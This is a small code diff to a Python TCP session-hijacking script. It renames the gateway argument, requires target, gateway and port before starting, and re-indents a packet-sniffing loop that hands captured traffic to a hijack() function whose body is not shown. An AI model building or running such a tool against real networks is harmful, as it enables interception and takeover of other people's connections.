@@ -37,7 +37,7 @@ def hijack(packet):
 # Specify Command Line Arguments
 parser = ArgumentParser()
 parser.add_argument('--target-ip', '-t', help='Target IP address')
-parser.add_argument('--gateway', '-g', help='Gateway IP address')
+parser.add_argument('--gateway-ip', '-g', help='Gateway IP address')
 parser.add_argument('--port', '-p', help='Port')
 parser.epilog = "Usage: python tcp_hijack.py -t <IP Address> -g <Gateway IP> -p <port>"        
 args = parser.parse_args()
@@ -46,12 +46,13 @@ args = parser.parse_args()
 try:
   socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
   
-  if args.target_ip is not None: # Checks if argument is not empty
-
-  # Initiate the sniff
-  sniff(count=0, prn = lambda packet:hijack(packet), 
-        filter=filter, 
-        lfilter=lambda(f):f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
+  # Checks if argument is not empty  
+  if args.target_ip is not None and args.gateway_ip is not None and args.port is not None: 
+    
+    # Initiate the sniff
+    sniff(count=0, prn = lambda packet:hijack(packet), 
+          filter=filter, 
+          lfilter=lambda(f):f.haslayer(IP) and f.haslayer(TCP) and f.haslayer(Ether))
 
    
 except:
